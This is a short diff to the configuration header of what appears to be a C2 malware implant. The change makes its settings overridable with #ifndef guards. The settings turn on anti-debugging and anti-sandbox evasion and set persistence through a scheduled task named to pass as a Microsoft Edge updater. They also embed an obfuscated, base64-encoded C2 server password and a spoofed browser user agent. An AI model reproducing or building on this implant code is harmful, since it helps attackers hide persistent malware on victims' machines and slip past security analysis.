@@ -25,14 +25,35 @@
 /****************************************/
 /*            Implant settings          */
 /****************************************/
-#define INITIAL_SLEEP_SECONDS 180
-#define REGISTER_MAX_RETRIES 5
-#define SCHTASK_PERSIST FALSE
-#define USE_ANTIDEBUG TRUE
-#define USE_ANTISANDBOX TRUE
+#ifndef INITIAL_SLEEP_SECONDS
+  #define INITIAL_SLEEP_SECONDS 180
+#endif
+
+#ifndef REGISTER_MAX_RETRIES
+  #define REGISTER_MAX_RETRIES 5
+#endif
+
+#ifndef SCHTASK_PERSIST
+  #define SCHTASK_PERSIST FALSE
+#endif
+
+#ifndef USE_ANTIDEBUG
+  #define USE_ANTIDEBUG TRUE
+#endif
+
+#ifndef USE_ANTISANDBOX
+  #define USE_ANTISANDBOX TRUE
+#endif
+
 #define C2_REGISTER_PASSWORD OBFUSCATED("SWh5bHhGOENYQWF1TW9KR3VTb0YwVkVWbDRud1RFaHc=")  // Base64 encoded server auth password
-#define REGISTER_USER_AGENT OBFUSCATED("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
-#define SCHEDULED_TASK_NAME OBFUSCATED("MicrosoftEdgeUpdateTaskMachineUA")
+
+#ifndef REGISTER_USER_AGENT
+  #define REGISTER_USER_AGENT OBFUSCATED("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+#endif
+
+#ifndef SCHEDULED_TASK_NAME
+  #define SCHEDULED_TASK_NAME OBFUSCATED("MicrosoftEdgeUpdateTaskMachineUA")
+#endif
 
 
 /****************************************/
